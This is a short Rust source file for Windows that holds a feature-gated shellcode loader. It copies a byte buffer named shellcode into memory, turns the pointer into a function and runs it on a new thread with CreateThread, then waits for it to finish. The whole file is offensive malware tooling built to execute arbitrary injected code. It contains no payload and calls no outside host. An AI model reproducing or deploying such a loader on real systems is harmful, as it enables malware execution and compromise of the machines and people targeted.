#[cfg(feature = "Mei_Thread")]
pub fn loader(shellcode: Vec<u8>) {
    use crate::memory;
    use windows::Win32::Foundation::GetLastError;
    use windows::Win32::System::Threading::{CreateThread, WaitForSingleObject};
    if shellcode.is_empty() {
        return;
    }

    unsafe {
        let memory = memory::malloc_and_set_memory(shellcode);
        let Ok(memory) = memory else {
            if cfg!(debug_assertions) {
                println!("[-] Malloc and set memory failed: {:#?}!", GetLastError());
            }
            return;
        };
        if memory.get_ptr() == std::ptr::null_mut() {
            if cfg!(debug_assertions) {
                println!("[-] Get memory pointer failed!");
            }
            return;
        }

        let func = std::mem::transmute(memory.get_ptr());
        let thread = CreateThread(
            None,
            0,
            func,
            None,
            windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
            None,
        );
        let Ok(thread) = thread else {
            return;
        };

        let _ = WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
